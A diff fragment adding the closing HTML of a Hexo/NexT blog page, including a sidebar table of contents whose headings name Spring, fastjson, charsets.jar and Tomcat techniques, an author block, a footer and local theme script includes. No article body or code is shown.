+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#spring%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%EF%BC%88charsets-jar%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">spring原生场景（charsets.jar）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson%E5%9C%BA%E6%99%AF%EF%BC%88charset-class%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">fastjson场景（charset&amp;class）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#charset"><span class="nav-number">2.0.1.</span> <span class="nav-text">charset</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#classes"><span class="nav-number">2.0.2.</span> <span class="nav-text">classes</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#classes-SPI"><span class="nav-number">3.</span> <span class="nav-text">classes+SPI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Charset-forName%E5%8E%9F%E7%90%86"><span class="nav-number">3.0.1.</span> <span class="nav-text">Charset.forName原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tomcat-docbase"><span class="nav-number">4.</span> <span class="nav-text">tomcat-docbase</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
